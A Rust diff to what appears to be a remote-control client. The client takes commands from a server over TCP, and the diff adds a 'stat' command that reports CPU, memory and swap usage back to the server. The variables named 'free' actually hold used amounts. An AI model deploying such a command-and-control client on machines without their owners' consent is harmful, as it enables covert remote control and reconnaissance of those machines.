@@ -1,12 +1,17 @@
+extern crate systemstat;
+
 use std::io::{Read, Write};
 use std::net::TcpStream;
 use std::{thread, time};
+use std::time::Duration;
 
 use anyhow::Result;
 use tracing::{debug, error, info};
+use systemstat::{System, Platform, saturating_sub_bytes};
 
 use crate::addreses::Address;
 use crate::{lock_mutex, utils::*, TCP_ADDRESS};
+
 
 pub fn connect() {
     match Client::new(
@@ -104,7 +109,6 @@ impl Client {
         while self.connected {
             let message = self.receive()?;
             let command = message.split_ascii_whitespace().collect::<Vec<&str>>();
-            println!("{}", command.len());
             let args = command[1..command.len()].to_vec();
 
             match command[0] {
@@ -113,6 +117,49 @@ impl Client {
                         messagebox(args.join(" "));
                         self.send("Done")?;
                     }
+                }
+                "stat" => {
+                    let sys = System::new();
+
+                    let mut cpu_usage = 0.;
+                    let mut memory_free = 0;
+                    let mut memory_total = 0;
+                    let mut swap_free = 0;
+                    let mut swap_total = 0;
+
+                    match sys.cpu_load_aggregate() 
+                    {
+                        Ok(cpu)=> {
+                            thread::sleep(Duration::from_secs(1));
+                            let cpu = cpu.done().unwrap();
+                            cpu_usage = cpu.user * 100.0;
+                        },
+                        Err(x) => {
+                            error!("CPU load: error: {}", x);
+                        }
+                    }
+
+                    match sys.memory() {
+                        Ok(mem) => {
+                            memory_free = saturating_sub_bytes(mem.total, mem.free).as_u64();
+                            memory_total = mem.total.as_u64();
+                        },
+                        Err(x) => {
+                            error!("\nMemory: error: {}", x);
+                        }
+                    }
+
+                    match sys.swap() {
+                        Ok(swap) => {
+                            swap_free = saturating_sub_bytes(swap.total, swap.free).as_u64();
+                            swap_total = swap.total.as_u64();
+                        },
+                        Err(x) => {
+                            error!("\nMemory: error: {}", x);
+                        }
+                    }
+
+                    self.send(format!("{} {} {} {} {}",cpu_usage,memory_free,memory_total,swap_free,swap_total).as_str())?;
                 }
                 "run" => {}
                 "reconnect" => {
